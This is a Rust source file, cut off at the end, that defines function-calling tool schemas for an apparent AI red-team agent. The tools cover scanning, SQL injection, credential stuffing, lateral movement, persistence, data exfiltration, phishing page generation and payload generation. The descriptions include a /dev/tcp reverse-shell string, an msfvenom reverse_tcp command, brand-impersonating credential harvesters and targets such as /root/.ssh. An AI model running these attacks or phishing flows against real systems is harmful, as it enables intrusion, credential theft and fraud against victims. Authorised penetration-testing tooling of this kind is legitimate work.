//! 红队网络安全工具集 —— 攻击链完整工具定义。
//!
//! 本模块定义了哪吒小爷可调用的全部红队技能，涵盖：
//! - 信息侦察：端口扫描、服务识别、漏洞探测
//! - 弱点利用：Web 漏洞利用、密码攻击、无线攻击
//! - 后渗透：权限提升、横向移动、持久化
//! - 社会工程：钓鱼攻击、凭证收集
//! - 逆向与分析：恶意软件分析、漏洞利用开发
//!
//! 所有工具均以 Claude Code 风格的 function calling 实现，
//! 每次执行前需要用户按 Y 确认，确保安全可控。

use crate::agent::config::AgentToolConfig;

/// 红队攻击链完整工具列表（供 AI function calling）
pub fn redteam_tool_definitions() -> Vec<AgentToolConfig> {
    vec![
        // ===== 信息侦察工具 =====
        run_nmap(),
        run_masscan(),
        run_gobuster(),
        run_nikto(),
        run_dirb(),
        enumerate_subdomains(),
        whois_lookup(),
        dns_recon(),
        vuln_scan(),
        search_exploitdb(),
        // ===== Web 渗透工具 =====
        sqlmap_scan(),
        xss_scanner(),
        command_injection(),
        upload_bypass(),
        ssrf_scanner(),
        oauth_security_check(),
        // ===== 密码攻击工具 =====
        hash_identifier(),
        wordlist_generator(),
        credential_stuffing(),
        rainbow_table_lookup(),
        ssh_key_attack(),
        // ===== 后渗透工具 =====
        system_enum(),
        privilege_escalation_check(),
        lateral_movement(),
        persistence_implant(),
        data_exfiltration(),
        // ===== 社会工程工具 =====
        phishing_template(),
        credential_collector(),
        payload_generator(),
        // ===== 逆向与分析工具 =====
        malware_hash_check(),
        yara_rule_scan(),
        strings_extractor(),
        decompile_bytecode(),
        // ===== 综合工具 =====
        exploit_search(),
        cve_lookup(),
        attack_path_planner(),
    ]
}

// ============================================================================
// 信息侦察工具
// ============================================================================

/// Nmap 端口扫描与服务识别
fn run_nmap() -> AgentToolConfig {
    AgentToolConfig {
        name: "run_nmap".into(),
        description: "执行 Nmap 端口扫描和服务版本识别。支持 SYN scan (-sS)、TCP connect (-sT)、UDP scan (-sU)、服务版本探测 (-sV)、操作系统识别 (-O)、漏洞脚本扫描 (--script)。示例：nmap -sS -sV -O -p 1-1000 target.com".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 IP 地址、域名或 CIDR 范围（如 192.168.1.0/24）"
                },
                "ports": {
                    "type": "string",
                    "description": "端口范围，如 '22,80,443' 或 '1-1000' 或 '1-65535'（全端口扫描）"
                },
                "scan_type": {
                    "type": "string",
                    "description": "扫描类型：syn（SYN 隐秘扫描，需 root）、tcp（TCP 连接扫描）、udp（UDP 扫描）、connect（SYN scan 默认）、version（服务版本探测）、os（操作系统识别）、vuln（漏洞脚本扫描）",
                    "enum": ["syn", "tcp", "udp", "version", "os", "vuln", "fast"]
                },
                "options": {
                    "type": "string",
                    "description": "额外 Nmap 选项，如 '-Pn'（跳过主机发现）、'-T4'（加速）、'-A'（激进扫描）"
                }
            },
            "required": ["target", "scan_type"]
        }),
    }
}

/// Masscan 高速端口扫描
fn run_masscan() -> AgentToolConfig {
    AgentToolConfig {
        name: "run_masscan".into(),
        description: "使用 Masscan 进行大规模高速端口扫描。速度可达 100 万包/秒，适合外网快速侦察。必须指定端口范围，支持rate参数控制速度。示例：masscan 10.0.0.0/8 -p1-10000 --rate=100000".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 IP 地址、域名或 CIDR 范围"
                },
                "ports": {
                    "type": "string",
                    "description": "端口范围，如 '80,443,8080' 或 '1-10000'"
                },
                "rate": {
                    "type": "integer",
                    "description": "发包速率，默认 100000（10万/秒），根据网络调整"
                }
            },
            "required": ["target", "ports"]
        }),
    }
}

/// Gobuster 目录和文件暴力枚举
fn run_gobuster() -> AgentToolConfig {
    AgentToolConfig {
        name: "run_gobuster".into(),
        description: "使用 Gobuster 枚举 Web 目录、文件和 DNS 子域名。支持 dir（目录枚举）、dns（子域名枚举）、vhost（虚拟主机发现）。需要提供字典文件或使用内置字典。示例：gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 URL，如 http://target.com 或 https://target.com"
                },
                "mode": {
                    "type": "string",
                    "description": "枚举模式：dir（目录/文件）、dns（子域名）、vhost（虚拟主机）",
                    "enum": ["dir", "dns", "vhost"]
                },
                "wordlist": {
                    "type": "string",
                    "description": "字典路径，如 /usr/share/wordlists/dirb/common.txt 或内置 short（Small dictionary）、medium（Medium dictionary）、big（Big dictionary）"
                },
                "extensions": {
                    "type": "string",
                    "description": "文件扩展名，如 'php,html,js,txt'，仅 dir 模式有效"
                }
            },
            "required": ["target", "mode"]
        }),
    }
}

/// Nikto Web 服务器漏洞扫描
fn run_nikto() -> AgentToolConfig {
    AgentToolConfig {
        name: "run_nikto".into(),
        description: "使用 Nikto 扫描 Web 服务器已知漏洞和配置问题。检测：过时服务器、敏感文件、CGI 滥用、SQL注入、XSS、文件上传等。示例：nikto -h http://target.com -p 80 -o result.txt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 URL 或 IP:port"
                },
                "port": {
                    "type": "integer",
                    "description": "端口号，默认 80"
                },
                "ssl": {
                    "type": "boolean",
                    "description": "是否使用 SSL/HTTPS"
                },
                "tuning": {
                    "type": "string",
                    "description": "调整扫描类型：1（文件泄露）、2（配置错误）、3（信息泄露）、4（注入）、5（远程文件）、6（拒绝服务）、7（命令执行）、8（SQL注入）、9（XSS）"
                }
            },
            "required": ["target"]
        }),
    }
}

/// DIRB 目录暴力枚举
fn run_dirb() -> AgentToolConfig {
    AgentToolConfig {
        name: "run_dirb".into(),
        description: "使用 DIRB 爬取和暴力枚举 Web 目录。内置多个字典，支持自定义。示例：dirb http://target.com /usr/share/wordlists/dirb/common.txt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 URL"
                },
                "wordlist": {
                    "type": "string",
                    "description": "字典路径，默认使用内置 common.txt"
                },
                "extensions": {
                    "type": "string",
                    "description": "文件扩展名，如 '.php,.html,.txt'"
                }
            },
            "required": ["target"]
        }),
    }
}

/// 子域名枚举
fn enumerate_subdomains() -> AgentToolConfig {
    AgentToolConfig {
        name: "enumerate_subdomains".into(),
        description: "综合枚举目标域名的子域名。组合使用：DNS 字典暴力、置换攻击（-alt）、VRF 攻击、暴力序列、搜索引擎查询。返回找到的子域名列表。示例：amass enum -passive -d target.com -o subdomains.txt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "domain": {
                    "type": "string",
                    "description": "目标主域名，如 target.com"
                },
                "mode": {
                    "type": "string",
                    "description": "枚举模式：passive（被动，不发包，使用搜索引擎）、active（主动，DNS查询）、all（全部）",
                    "enum": ["passive", "active", "all"]
                },
                "sources": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "数据源：dnsdumpster、virustotal、crtsh、alienvault 等"
                }
            },
            "required": ["domain"]
        }),
    }
}

/// WHOIS 查询
fn whois_lookup() -> AgentToolConfig {
    AgentToolConfig {
        name: "whois_lookup".into(),
        description: "执行 WHOIS 查询获取域名注册信息、注册商、NS服务器、创建/过期日期、管理联系信息等。示例：whois target.com".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标域名或 IP 地址"
                }
            },
            "required": ["target"]
        }),
    }
}

/// DNS 信息收集
fn dns_recon() -> AgentToolConfig {
    AgentToolConfig {
        name: "dns_recon".into(),
        description: "综合 DNS 侦察：区域传送、记录类型枚举（A、MX、NS、TXT、SPF、DMARC、DNSSEC）、DNS 字典暴力、缓存嗅探。示例：dnsrecon -d target.com -t std,axfr,brt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "domain": {
                    "type": "string",
                    "description": "目标域名"
                },
                "record_types": {
                    "type": "string",
                    "description": "查询的记录类型：all、A、AAAA、MX、NS、TXT、SPF、DMARC、CNAME、SOA、AXFR"
                },
                "wordlist": {
                    "type": "string",
                    "description": "字典暴力时使用的字典路径"
                }
            },
            "required": ["domain"]
        }),
    }
}

/// 综合漏洞扫描
fn vuln_scan() -> AgentToolConfig {
    AgentToolConfig {
        name: "vuln_scan".into(),
        description: "使用 Nessus/OpenVAS 或 NSE 脚本进行综合漏洞扫描。检测：已知 CVE、配置缺陷、弱服务、默认凭证、敏感端口暴露。示例：nmap --script vuln -sV target.com".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 IP 或 CIDR"
                },
                "scan_profile": {
                    "type": "string",
                    "description": "扫描配置文件：basic（基础扫描）、discovery（发现）、scan（完整扫描）、audit（合规审计）、custom（自定义，需指定脚本）",
                    "enum": ["basic", "discovery", "scan", "audit", "custom"]
                },
                "scripts": {
                    "type": "string",
                    "description": "自定义 NSE 脚本，如 'ssl-enum-ciphers,ssh2-enum-algos'（仅 custom 模式）"
                }
            },
            "required": ["target"]
        }),
    }
}

/// Exploit-DB 漏洞搜索
fn search_exploitdb() -> AgentToolConfig {
    AgentToolConfig {
        name: "search_exploitdb".into(),
        description: "在 Exploit-DB（ exploit-db.com）中搜索目标软件/版本的已知漏洞和利用代码。返回 CVE ID、EDB-ID、漏洞描述、Rank、类型。示例：searchsploit openssh 7.4".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "software": {
                    "type": "string",
                    "description": "软件名称，如 'apache', 'nginx', 'wordpress', 'mysql'"
                },
                "version": {
                    "type": "string",
                    "description": "具体版本号（可选），如 '2.4.6'"
                },
                "platform": {
                    "type": "string",
                    "description": "平台：linux、windows、php、python、java、unix、macos、android"
                },
                "exploit_type": {
                    "type": "string",
                    "description": "漏洞类型：remote、local、dos、shellcode、webapps、cve"
                }
            },
            "required": ["software"]
        }),
    }
}

// ============================================================================
// Web 渗透工具
// ============================================================================

/// SQLMap 自动 SQL 注入扫描
fn sqlmap_scan() -> AgentToolConfig {
    AgentToolConfig {
        name: "sqlmap_scan".into(),
        description: "使用 SQLMap 自动检测和利用 SQL 注入漏洞。支持：布尔盲注、报错注入、联合查询、堆叠查询、时间盲注、带外通道。示例：sqlmap -u 'http://target.com/page?id=1' --dbs --batch".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_url": {
                    "type": "string",
                    "description": "目标 URL，包含可能存在注入的参数"
                },
                "method": {
                    "type": "string",
                    "description": "HTTP 方法：GET 或 POST",
                    "enum": ["GET", "POST"]
                },
                "data": {
                    "type": "string",
                    "description": "POST 请求体，如 'username=admin&password=123'（POST 模式时）"
                },
                "cookie": {
                    "type": "string",
                    "description": "认证 Cookie，如 'PHPSESSID=abc123'"
                },
                "level": {
                    "type": "integer",
                    "description": "检测级别 1-5，越高测试越多payload，默认 1"
                },
                "risk": {
                    "type": "integer",
                    "description": "风险级别 1-3：1（安全测试）、2（依赖性检测）、3（危险写入操作）"
                },
                "action": {
                    "type": "string",
                    "description": "操作目标：detect（仅检测）、dbs（枚举数据库）、tables（枚举表）、columns（枚举列）、dump（导出数据）、os-shell（系统shell）、sql-shell（SQL shell）",
                    "enum": ["detect", "dbs", "tables", "columns", "dump", "os-shell", "sql-shell"]
                }
            },
            "required": ["target_url"]
        }),
    }
}

/// XSS 扫描器
fn xss_scanner() -> AgentToolConfig {
    AgentToolConfig {
        name: "xss_scanner".into(),
        description: "检测和利用跨站脚本（XSS）漏洞。支持：反射型、存储型、DOM 型。内置多种 bypass 编码：HTML 实体、大小写混淆、事件处理器、多层嵌套。示例：xsstrike -u 'http://target.com/search?q=test'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_url": {
                    "type": "string",
                    "description": "目标 URL"
                },
                "param": {
                    "type": "string",
                    "description": "要测试的参数名（不提供则自动检测所有参数）"
                },
                "payload_type": {
                    "type": "string",
                    "description": "XSS 类型：reflected（反射型）、stored（存储型）、dom（DOM型）、all（全部）",
                    "enum": ["reflected", "stored", "dom", "all"]
                },
                "blind": {
                    "type": "boolean",
                    "description": "是否启用 blind XSS 模式（检测无回显的存储型 XSS）"
                }
            },
            "required": ["target_url"]
        }),
    }
}

/// 命令注入检测
fn command_injection() -> AgentToolConfig {
    AgentToolConfig {
        name: "command_injection".into(),
        description: "检测 OS 命令注入漏洞（Command Injection）。通过特殊字符测试：; | & $ ` () {} 等，验证能否执行额外系统命令。示例：检查 ping、traceroute、nslookup 等功能的注入点。示例：commix -u 'http://target.com/ping?ip=127.0.0.1'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_url": {
                    "type": "string",
                    "description": "可能存在注入点的目标 URL"
                },
                "param": {
                    "type": "string",
                    "description": "参数名"
                },
                "technique": {
                    "type": "string",
                    "description": "注入技术：simple（简单注入）、heuristic（启发式）、time-based（时间盲注）、file-based（文件盲注）",
                    "enum": ["simple", "heuristic", "time-based", "file-based"]
                }
            },
            "required": ["target_url"]
        }),
    }
}

/// 文件上传 bypass
fn upload_bypass() -> AgentToolConfig {
    AgentToolConfig {
        name: "upload_bypass".into(),
        description: "测试文件上传功能的 bypass 技巧。尝试：扩展名绕过（.php5、.phtml）、大小写（.PhP）、双写（.phphp）、空字节（shell.php%00.jpg）、MIME 伪装、Content-Disposition 改、竞争上传、图像头欺骗（图片马）。返回成功 bypass 的方法和利用方式。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "upload_url": {
                    "type": "string",
                    "description": "文件上传端点 URL"
                },
                "file_type": {
                    "type": "string",
                    "description": "允许的文件类型：image（图片）、document（文档）、any（任意）"
                },
                "payload_type": {
                    "type": "string",
                    "description": "上传的 payload 类型：php（PHP webshell）、jsp（JSP webshell）、asp（ASP webshell）、custom（自定义）",
                    "enum": ["php", "jsp", "asp", "custom"]
                },
                "custom_payload": {
                    "type": "string",
                    "description": "自定义 payload 内容（custom 类型时）"
                }
            },
            "required": ["upload_url"]
        }),
    }
}

/// SSRF 扫描器
fn ssrf_scanner() -> AgentToolConfig {
    AgentToolConfig {
        name: "ssrf_scanner".into(),
        description: "检测服务器端请求伪造（SSRF）漏洞。测试：URL 跳转、内部服务访问（localhost、169.254.169.254）、云元数据、协议滥用（gopher://、dict://）。示例：检查图片加载、PDF 生成、webhook 等功能。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_url": {
                    "type": "string",
                    "description": "存在 SSRF 风险的目标 URL"
                },
                "param": {
                    "type": "string",
                    "description": "测试的参数名"
                },
                "test_targets": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "测试目标列表：['http://localhost', 'http://127.0.0.1', 'http://169.254.169.254', 'file:///etc/passwd']"
                }
            },
            "required": ["target_url"]
        }),
    }
}

/// OAuth 安全检查
fn oauth_security_check() -> AgentToolConfig {
    AgentToolConfig {
        name: "oauth_security_check".into(),
        description: "审计 OAuth 2.0 实现的安全性。检查：redirect_uri 校验、state 参数存在性、token 泄露、授权码重用、scope 过度授权、PKCE 实现、nonce 验证。示例：分析 OAuth 登录流程的每个步骤。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "oauth_url": {
                    "type": "string",
                    "description": "OAuth 授权端点 URL"
                },
                "client_id": {
                    "type": "string",
                    "description": "OAuth 客户端 ID"
                },
                "redirect_uri": {
                    "type": "string",
                    "description": "redirect_uri（回调地址）"
                },
                "check_types": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "检查项：redirect_uri（URI校验）、state（state参数）、token（token安全）、scope（权限范围）、pkce（PKCE验证）、revocation（撤销端点）"
                }
            },
            "required": ["oauth_url"]
        }),
    }
}

// ============================================================================
// 密码攻击工具
// ============================================================================

/// 哈希识别
fn hash_identifier() -> AgentToolConfig {
    AgentToolConfig {
        name: "hash_identifier".into(),
        description: "识别哈希算法类型。输入哈希值，自动分析其特征判断是 MD5、SHA1、SHA256、NTLM、bcrypt、argon2、MySQL、PGSQL、LM、CRC32 等哪种算法。示例：hash-identifier '5f4dcc3b5aa765d61d8327deb882cf99'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "hash": {
                    "type": "string",
                    "description": "要识别的哈希值"
                }
            },
            "required": ["hash"]
        }),
    }
}

/// 密码字典生成
fn wordlist_generator() -> AgentToolConfig {
    AgentToolConfig {
        name: "wordlist_generator".into(),
        description: "基于目标信息生成定制化密码字典。输入：用户名、生日、公司名、关键词、电话等。组合变形：首字母大写、Leet speak（a→@）、年份追加、特殊符号。示例：cewl http://target.com -m 3 -w dict.txt".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_info": {
                    "type": "string",
                    "description": "目标相关信息：用户名、公司名、域名、关键词等（逗号分隔）"
                },
                "target_url": {
                    "type": "string",
                    "description": "爬取网站生成社工字典的 URL（可选）"
                },
                "min_length": {
                    "type": "integer",
                    "description": "最小密码长度，默认 6"
                },
                "max_length": {
                    "type": "integer",
                    "description": "最大密码长度，默认 20"
                },
                "transformations": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "密码变形规则：leet（a→@/4）、capitalize（首字母大写）、append_year（追加年份）、append_special（追加特殊符号）"
                }
            },
            "required": ["target_info"]
        }),
    }
}

/// 凭证填充攻击
fn credential_stuffing() -> AgentToolConfig {
    AgentToolConfig {
        name: "credential_stuffing".into(),
        description: "使用泄露的账号密码组合对目标进行凭证填充攻击（Credential Stuffing）。支持多线程、代理轮换、失败检测、验证码处理。示例：hydra -l admin -P passwords.txt ssh://target.com".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标服务：ssh、ftp、smb、http-post-form、mysql、rdp、vnc、smtp、pop3 等"
                },
                "target_url": {
                    "type": "string",
                    "description": "目标 URL（HTTP 表单登录时）"
                },
                "username": {
                    "type": "string",
                    "description": "单个用户名或 -L user.txt 指定用户字典"
                },
                "password": {
                    "type": "string",
                    "description": "单个密码或 -P pass.txt 指定密码字典"
                },
                "threads": {
                    "type": "integer",
                    "description": "并发线程数，默认 16"
                },
                "form_params": {
                    "type": "string",
                    "description": "HTTP 表单参数，格式 'user_field=username&pass_field=password&submit=login'"
                }
            },
            "required": ["target"]
        }),
    }
}

/// 彩虹表查询
fn rainbow_table_lookup() -> AgentToolConfig {
    AgentToolConfig {
        name: "rainbow_table_lookup".into(),
        description: "使用彩虹表快速查询哈希对应的明文密码。兆级哈希库：MD5、SHA1、SHA256、NTLM。支持离线查询，速度比暴力破解快千倍。示例：rtgen md5 loweralpha 1 10 0 1000 10000 0 && rtsort .".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "hash": {
                    "type": "string",
                    "description": "要查询的哈希值"
                },
                "hash_type": {
                    "type": "string",
                    "description": "哈希算法：md5、sha1、sha256、ntlm、mysql5、sha512crypt",
                    "enum": ["md5", "sha1", "sha256", "ntlm", "mysql5", "sha512crypt"]
                }
            },
            "required": ["hash", "hash_type"]
        }),
    }
}

/// SSH 密钥攻击
fn ssh_key_attack() -> AgentToolConfig {
    AgentToolConfig {
        name: "ssh_key_attack".into(),
        description: "测试 SSH 公钥认证安全性。功能：枚举有效用户名、测试密钥暴力破解、检测 weak key、authorized_keys 注入测试。示例：msfconsole -x 'use auxiliary/scanner/ssh/ssh_login'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "目标 SSH 服务器 IP:port"
                },
                "username": {
                    "type": "string",
                    "description": "用户名"
                },
                "key_file": {
                    "type": "string",
                    "description": "SSH 私钥文件路径"
                },
                "passphrase": {
                    "type": "string",
                    "description": "私钥密码（如果有）"
                }
            },
            "required": ["target"]
        }),
    }
}

// ============================================================================
// 后渗透工具
// ============================================================================

/// 系统信息枚举
fn system_enum() -> AgentToolConfig {
    AgentToolConfig {
        name: "system_enum".into(),
        description: "获取目标系统详细信息。收集：操作系统版本、内核版本、主机名、当前用户/权限、sudo 免密、计划任务、环境变量、网络配置（网卡/IP/路由）、已安装软件、运行进程、服务、磁盘挂载、iptables 规则。示例：使用 LinEnum、LinPEAS、WinPEAS 进行枚举。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_type": {
                    "type": "string",
                    "description": "目标系统类型：linux、windows",
                    "enum": ["linux", "windows"]
                },
                "enum_level": {
                    "type": "string",
                    "description": "枚举深度：basic（基础信息）、full（完整枚举）、quick（快速检查关键项）",
                    "enum": ["basic", "full", "quick"]
                }
            },
            "required": ["target_type"]
        }),
    }
}

/// 权限提升检测
fn privilege_escalation_check() -> AgentToolConfig {
    AgentToolConfig {
        name: "privilege_escalation_check".into(),
        description: "自动化权限提升（Privilege Escalation）检测。Linux：SUID/SGID 文件、sudo 配置错误、nfs 配置问题、cron 任务、Capabilities、定时任务、通配符注入、内核exploit。Windows：AlwaysInstallElevated、注册表配置、的服务路径、令牌权限、BypassUAC、计划任务。示例：使用 pspy、linux-exploit-suggester、windows-exploit-suggester。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_type": {
                    "type": "string",
                    "description": "目标系统类型：linux、windows",
                    "enum": ["linux", "windows"]
                },
                "check_kernel": {
                    "type": "boolean",
                    "description": "是否检测内核 exploit"
                },
                "check_sudo": {
                    "type": "boolean",
                    "description": "是否检测 sudo 配置漏洞"
                }
            },
            "required": ["target_type"]
        }),
    }
}

/// 横向移动
fn lateral_movement() -> AgentToolConfig {
    AgentToolConfig {
        name: "lateral_movement".into(),
        description: "内网横向移动技术。方法：Pass-the-Hash、Pass-the-Ticket、远程服务利用（WMI、WinRM、PSExec）、SSH 跳转、端口转发与隧道、密码喷洒、Kerberoasting、黄金/白银票据、LLMNR/NBT-NS 欺骗。示例：使用 CrackMapExec、evil-winrm、impacket。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "technique": {
                    "type": "string",
                    "description": "横向移动技术：pth（Pass-the-Hash）、wmi（WMI 远程执行）、winrm（WinRM）、smb（SMB/PsExec）、ssh（SSH跳转）、rportfwd（端口转发）、kerberoast（Kerberoasting）、ptt（Pass-the-Ticket）",
                    "enum": ["pth", "wmi", "winrm", "smb", "ssh", "rportfwd", "kerberoast", "ptt"]
                },
                "target": {
                    "type": "string",
                    "description": "目标 IP 或主机名"
                },
                "credentials": {
                    "type": "string",
                    "description": "凭证：格式 'username:password' 或 'domain/username:hash'"
                }
            },
            "required": ["technique", "target"]
        }),
    }
}

/// 持久化植入
fn persistence_implant() -> AgentToolConfig {
    AgentToolConfig {
        name: "persistence_implant".into(),
        description: "建立持久化控制通道（需要高权限）。Linux：cron、systemd service、bashrc 篡改、SSH authorized_keys、SUID后门、共享库注入、启动脚本。Windows：注册表Run键、服务创建、计划任务、WMI订阅、PowerShell profile、Startup文件夹、DLL劫持。示例：生成稳定的反向shell payload。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_type": {
                    "type": "string",
                    "description": "目标系统：linux、windows",
                    "enum": ["linux", "windows"]
                },
                "method": {
                    "type": "string",
                    "description": "持久化方法：cron（Linux定时任务）、systemd（Linux服务）、reg（Windows注册表）、scheduled（计划任务）、service（Windows服务）、ssh_key（SSH公钥）、backdoor（后门程序）",
                    "enum": ["cron", "systemd", "reg", "scheduled", "service", "ssh_key", "backdoor"]
                },
                "payload": {
                    "type": "string",
                    "description": "要植入的 payload，如 'bash -i >& /dev/tcp/attacker/port 0>&1'"
                }
            },
            "required": ["target_type", "method"]
        }),
    }
}

/// 数据窃取
fn data_exfiltration() -> AgentToolConfig {
    AgentToolConfig {
        name: "data_exfiltration".into(),
        description: "目标数据窃取与回传。策略：压缩加密（tar+gzip+openssl）、分片传输、DNS 隧道、ICMP 隧道、Covert channel、Steganography（隐写术）。可窃取类型：数据库 dump、配置文件、SSH 密钥、浏览器凭证、密码文件、敏感文档。示例：使用 exfil、dnsteff、icmptunnel。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "data_type": {
                    "type": "string",
                    "description": "数据类型：credentials（凭证文件）、configs（配置文件）、databases（数据库）、documents（敏感文档）、full（整盘复制）",
                    "enum": ["credentials", "configs", "databases", "documents", "full"]
                },
                "exfil_method": {
                    "type": "string",
                    "description": "外传方式：https（HTTPS直接传输）、dns（DNS隧道）、icmp（ICMP隧道）、stego（隐写术）、compress（本地压缩待手动获取）",
                    "enum": ["https", "dns", "icmp", "stego", "compress"]
                },
                "target_path": {
                    "type": "string",
                    "description": "要窃取的数据路径，如 '/etc/passwd' 或 '/root/.ssh'"
                }
            },
            "required": ["data_type", "target_path"]
        }),
    }
}

// ============================================================================
// 社会工程工具
// ============================================================================

/// 钓鱼邮件模板生成
fn phishing_template() -> AgentToolConfig {
    AgentToolConfig {
        name: "phishing_template".into(),
        description: "生成社工钓鱼攻击模板。支持：邮件钓鱼（钓鱼链接、恶意附件、凭证收集页面）、短信钓鱼（Smishing）、语音钓鱼（Vishing）。自动生成逼真的钓鱼页面：伪造登录页、证书警告、密码过期提醒等。示例：使用 setoolkit、king-phisher、gophish。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "phishing_type": {
                    "type": "string",
                    "description": "钓鱼类型：email（邮件钓鱼）、sms（短信钓鱼）、voice（语音钓鱼）、clone（网站克隆）",
                    "enum": ["email", "sms", "voice", "clone"]
                },
                "target_brand": {
                    "type": "string",
                    "description": "冒充的品牌/服务：如 'Microsoft'、'Google'、'Apple'、'银行名称'"
                },
                "attack_scenario": {
                    "type": "string",
                    "description": "攻击场景：password_reset（密码重置）、account_verify（账户验证）、security_alert（安全警报）、invoice（发票通知）、delivery（快递通知）"
                },
                "redirect_url": {
                    "type": "string",
                    "description": "钓鱼重定向到的恶意 URL"
                }
            },
            "required": ["phishing_type", "target_brand"]
        }),
    }
}

/// 凭证收集器
fn credential_collector() -> AgentToolConfig {
    AgentToolConfig {
        name: "credential_collector".into(),
        description: "部署钓鱼凭证收集服务。功能：生成伪造登录页面（支持 Gmail、Office365、Outlook、Facebook、银行等常见服务）、自动记录输入的账号密码、记录 IP/UA/地理位置、邮件通知收集结果。示例：使用 social engineering toolkit 的 credential harvester。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_service": {
                    "type": "string",
                    "description": "目标服务：gmail、office365、outlook、facebook、twitter、linkedin、bank（自定义）",
                    "enum": ["gmail", "office365", "outlook", "facebook", "twitter", "linkedin", "bank", "custom"]
                },
                "custom_login_url": {
                    "type": "string",
                    "description": "自定义登录页面 URL（clone 模式时提供）"
                },
                "listen_port": {
                    "type": "integer",
                    "description": "监听端口，默认 80"
                },
                "notify_email": {
                    "type": "string",
                    "description": "收集到凭证后发送通知的邮箱"
                }
            },
            "required": ["target_service"]
        }),
    }
}

/// Payload 生成器
fn payload_generator() -> AgentToolConfig {
    AgentToolConfig {
        name: "payload_generator".into(),
        description: "生成各类攻击 payload。支持：Meterpreter reverse shell、PowerShell empire、Cobalt Strike beacon、Python/Perl/Ruby reverse shell、JavaMeterpreter、Linux ELF、Windows EXE/DLL/VBS、Office宏、Docker break-out。自动编码和绑定。示例：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "payload_type": {
                    "type": "string",
                    "description": "Payload 类型：meterpreter、cs_beacon、powershell、python_shell、python_meterpreter、java_meterpreter、linux_elf、windows_exe、windows_dll、macro（Office宏）、docker_shell",
                    "enum": ["meterpreter", "cs_beacon", "powershell", "python_shell", "python_meterpreter", "java_meterpreter", "linux_elf", "windows_exe", "windows_dll", "macro", "docker_shell"]
                },
                "lhost": {
                    "type": "string",
                    "description": "监听主机 IP（你的攻击机）"
                },
                "lport": {
                    "type": "integer",
                    "description": "监听端口"
                },
                "format": {
                    "type": "string",
                    "description": "输出格式：raw、exe、elf、dll、ps1、jar、python、ruby、c、python_raw",
                    "enum": ["raw", "exe", "elf", "dll", "ps1", "jar", "python", "ruby", "c", "python_raw"]
                },
                "encoder": {
                    "type": "string",
                    "description": "编码器：shikata_ga_nai（msf）、xor、base64、cmd（多重base64嵌套）"
                }
            },
            "required": ["payload_type", "lhost", "lport"]
        }),
    }
}

// ============================================================================
// 逆向与分析工具
// ============================================================================

/// 恶意软件哈希查询
fn malware_hash_check() -> AgentToolConfig {
    AgentToolConfig {
        name: "malware_hash_check".into(),
        description: "查询恶意软件哈希值（MD5/SHA1/SHA256）信誉。支持：VirusTotal、Hybrid Analysis、Maltiverse、Malware Bazaar。返回：检出率、厂商判定、样本类型、家族名、AT&T、MITRE ATT&CK 战术映射。示例：curl 'https://www.virustotal.com/api/v3/files/HASH'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "file_hash": {
                    "type": "string",
                    "description": "文件哈希值：MD5、SHA1 或 SHA256"
                },
                "engines": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "查询的引擎：vt（VirusTotal）、ha（HybridAnalysis）、mb（MalwareBazaar）、mn（Maltiverse），空则查全部"
                }
            },
            "required": ["file_hash"]
        }),
    }
}

/// YARA 规则扫描
fn yara_rule_scan() -> AgentToolConfig {
    AgentToolConfig {
        name: "yara_rule_scan".into(),
        description: "使用 YARA 规则扫描文件或目录，检测恶意代码特征。支持：自定义规则、导入社区规则库（yar rules）、PE/Memory/Process 扫描。输出匹配到的规则名、规则组、威胁等级。示例：yara -r suspicious.yar ./malware_folder".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "target_path": {
                    "type": "string",
                    "description": "扫描目标：文件路径或目录"
                },
                "rule_source": {
                    "type": "string",
                    "description": "规则来源：builtin（内置APT规则）、community（社区规则库）、custom（自定义规则内容）",
                    "enum": ["builtin", "community", "custom"]
